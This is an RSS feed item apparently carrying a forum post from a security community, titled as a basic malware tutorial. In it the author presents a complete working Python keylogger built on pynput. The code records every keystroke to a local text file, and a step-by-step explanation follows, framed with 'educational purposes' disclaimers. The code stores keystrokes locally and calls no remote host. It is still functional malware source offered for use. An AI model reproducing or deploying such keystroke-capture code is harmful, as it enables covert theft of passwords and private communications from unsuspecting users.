          <dc:creator><![CDATA[black.hat_hk]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p><strong>INTRODUCTION</strong><br>
Keyloggers are <strong>tools that record what a person types on a device</strong>. While there are legitimate and legal uses for keyloggers, many uses for keyloggers are malicious. In a keylogger attack, the keylogger software records every keystroke on the victim’s device and sends it to the attacker.</p>
<p>I am a beginner in Python and especially malware development in Windows. So I have made a keylogger for Windows, that is pretty basic, but probably a bit different from others.</p>
<p>*Please note that it was written for <strong>EDUCATIONAL PURPOSES</strong><br>
<strong>GENERAL OVERVIEW</strong><br>
A keylogger is a tool that can track and record keystrokes, typically used to monitor keyboard activity. It can exist as either hardware or software, but this article will focus primarily on software keyloggers. When a key is pressed, the keylogger captures the input and can send it to its intended destination. Keyloggers may or may not be considered malware, depending on the context in which they are used. For example, parents may use keyloggers to monitor their child’s computer activity, or employers may use them to ensure that employees are following company policies. These types of applications are often referred to as Possibly Unwanted Programs (PUP) or Possibly Unwanted Applications (PUA).<br>
<strong>LET’S START</strong><br>
Before start the program you have to install the ‘<code>pynput</code> ‘ library if you haven’t already. You can do this by running the following command in your terminal or command prompt:</p>
<pre><code class="lang-auto">pip install pynput
</code></pre>
<p><em>Let’s write the program</em></p>
<pre><code class="lang-auto">import pynput
from pynput.keyboard import Key, Listener

keys = []

def press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('test.txt', 'w') as f:
        for key in keys:
            # removing ' '
            k = str(key).replace("'", "")
            f.write(k)

            # every keystroke for readability
            f.write(' ')

def release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # stop listener
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
</code></pre>
<p>The program starts by importing the necessary modules from <code>pynput</code>.</p>
<p>It initializes an empty list called ‘<code>keys</code>‘ to store the captured keystrokes.</p>
<p>The ‘<code>press</code>‘ function is defined, which is called whenever a key is pressed. Inside this function, the pressed key is appended to the <code>keys</code> list, and then the ‘<code>write_file</code>‘ function is called to save the captured keystrokes to a file.</p>
<p>The ‘<code>write_file</code>‘ function takes the <code>keys</code> list as input and opens a file named ‘<code>test.txt</code>‘ in write mode. It iterates over each key in the list, removes the single quotes around the key representation (to improve readability), and writes the key value to the file. Additionally, it writes a space character after each key for readability purposes.</p>
<p>The ‘<code>release</code>‘ function is defined, which is called when a key is released. Inside this function, it prints the released key. If the released key is the “Esc” key, it returns <code>False</code> to stop the listener and terminate the program.</p>
<p>The program enters a <code>with</code> statement to create a <code>Listener</code> object from ‘<code>pynput</code>‘ using the ‘<code>press</code>‘ and ‘<code>release</code>‘ functions. The listener is responsible for capturing the keyboard events.</p>
<p>The listener starts capturing keyboard events using the <code>listener.join()</code> method. It will keep running in the background and capturing keystrokes until the program is terminated.</p>
<p>When executed, the program will log all the keystrokes in real-time and save them to the ‘<code>test.txt</code>‘ file. The program will also print a message indicating whether the pressed key is alphanumeric or a special key.</p>
<p><em><strong>REMEMBER THIS PROGRAM IS ONLY FOR EDUCATIONAL PURPOSE .</strong></em></p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/keylogger-a-basic-malware/35169">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/keylogger-a-basic-malware/35169</link>
          <pubDate>Mon, 22 May 2023 14:01:30 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-35169</guid>
          <source url="https://0x00sec.org/t/keylogger-a-basic-malware/35169.rss">Keylogger :- A Basic Malware</source>
        </item>
  </channel>
</rss>
